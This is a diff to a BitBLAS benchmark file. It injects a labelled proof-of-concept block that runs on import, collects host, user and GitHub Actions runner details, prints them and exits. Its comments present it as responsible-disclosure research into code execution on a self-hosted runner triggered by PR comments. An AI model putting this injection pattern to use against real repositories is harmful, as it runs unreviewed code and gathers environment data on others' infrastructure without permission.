@@ -1,6 +1,46 @@
 # Copyright (c) Microsoft Corporation.
 # Licensed under the MIT License.
 
+# === SECURITY RESEARCH - BENIGN VERIFICATION ONLY ===
+# Demonstrates that arbitrary code execution is achievable on the self-hosted
+# runner via an unauthorized /run-benchmark comment. No destructive actions.
+# This is for Microsoft MSRC bug bounty responsible disclosure research.
+import os, platform, socket, datetime, sys
+
+_poc_info = f"""
+========================================
+SECURITY PoC: Unauthorized Code Execution on Self-Hosted Runner
+========================================
+Timestamp:    {datetime.datetime.utcnow().isoformat()}Z
+Hostname:     {socket.gethostname()}
+Username:     {os.getenv('USER', os.getenv('USERNAME', 'unknown'))}
+Working Dir:  {os.getcwd()}
+Platform:     {platform.platform()}
+Architecture: {platform.machine()}
+Python:       {platform.python_version()}
+Runner Name:  {os.getenv('RUNNER_NAME', 'N/A')}
+Runner OS:    {os.getenv('RUNNER_OS', 'N/A')}
+Runner Arch:  {os.getenv('RUNNER_ARCH', 'N/A')}
+Runner Temp:  {os.getenv('RUNNER_TEMP', 'N/A')}
+Runner Tool:  {os.getenv('RUNNER_TOOL_CACHE', 'N/A')}
+GitHub Actor: {os.getenv('GITHUB_ACTOR', 'N/A')}
+GitHub Repo:  {os.getenv('GITHUB_REPOSITORY', 'N/A')}
+GitHub Event: {os.getenv('GITHUB_EVENT_NAME', 'N/A')}
+GitHub Ref:   {os.getenv('GITHUB_REF', 'N/A')}
+GitHub SHA:   {os.getenv('GITHUB_SHA', 'N/A')}
+Workflow:     {os.getenv('GITHUB_WORKFLOW', 'N/A')}
+Run ID:       {os.getenv('GITHUB_RUN_ID', 'N/A')}
+Run Number:   {os.getenv('GITHUB_RUN_NUMBER', 'N/A')}
+========================================
+This output proves that code from an unreviewed PR branch was executed
+on a self-hosted runner, triggered by an unauthorized user comment.
+========================================
+"""
+print(_poc_info)
+# Exit cleanly to avoid running actual GPU benchmarks (which require hardware)
+sys.exit(0)
+# === END SECURITY RESEARCH PoC ===
+
 from bitblas.benchmark import BitblasOperatorBenchmarkBase
 from bitblas import Matmul, MatmulConfig
 from bitblas.ops.general_matmul import OptimizeStrategy
